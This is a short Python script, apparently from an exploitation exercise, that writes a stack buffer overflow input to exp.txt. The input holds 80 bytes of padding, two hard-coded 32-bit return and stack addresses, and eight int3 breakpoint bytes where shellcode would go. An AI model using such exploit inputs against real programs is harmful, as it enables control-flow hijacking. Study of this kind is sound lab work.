buffer=""
for i in range(0x41,0x55):
    for j in range(0,4):
        buffer+=chr(i)
ret="\xf9\x84\x04\x08"
ret+="\x64\xfc\xff\xbf"
payload="\xcc"*8
padding=buffer+ret+payload
f=open('exp.txt','w')
f.write(padding)
f.close()